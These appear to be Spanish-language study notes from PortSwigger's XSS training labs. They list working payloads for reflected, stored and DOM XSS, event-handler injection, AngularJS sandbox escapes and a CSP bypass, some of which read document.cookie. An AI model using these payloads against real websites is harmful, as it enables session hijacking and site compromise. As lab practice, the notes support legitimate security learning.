https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
## LAB 1

El lab cuenta con una barra de busqueda vulnerable a xss reflected, con el clasico alert podemos inyectar codigo:

```
<script>alert(1)</script>
```

## LAB 2

Hay un XSS Stored en la seccion de comentarios sin proteccion alguna:

```
<script>alert(1)</script>
```

## LAB 3

Al igual que en el primer lab tenemos una barra de busqueda, le mandamos un string aleatorio y lo capturamos con Burp Suite. En el repeater vemos que nuestro string lo carga un img src entonces podemos inyectar el siguiente payload:

```
"><svg onload=alert(1)>
```

## LAB 4

En este lab la etiqueta script no le gusta asique probamos el clasico payload con img:

```
<img src=1 onerror=alert(1)>
```

## LAB 5

Este lab es un XSS basado en DOM, si observamos la url existe un parametro que es returnPath, si lo modificamos podemos obtener el document cookie de la siguiente manera:

```
javascript:alert(document.cookie)
```
## LAB 6

Al escribir un string random en la barra de buscar vemos que se guarda en un parametro value entonces cerrando la comilla e inyectando el siguiente codigo podremos hacerlo:

```
"onmouseover="alert(1)
```



# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- Enter a random alphanumeric string into the search box.
- View the page source and observe that your random string is enclosed in an `ng-app` directive.
- Enter the following AngularJS expression in the search box:

`{{$on.constructor('alert(1)')()}}`

# Lab: Reflected XSS with AngularJS sandbox escape without strings


`https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`


# Lab: Reflected XSS with AngularJS sandbox escape and CSP

1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
    
    `<script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>`
2. Click "Store" and "Deliver exploit to victim".

The exploit uses the `ng-focus` event in AngularJS to create a focus event that bypasses CSP. It also uses `$event`, which is an AngularJS variable that references the event object. The `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.

Normally, `|` is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the `orderBy` filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.

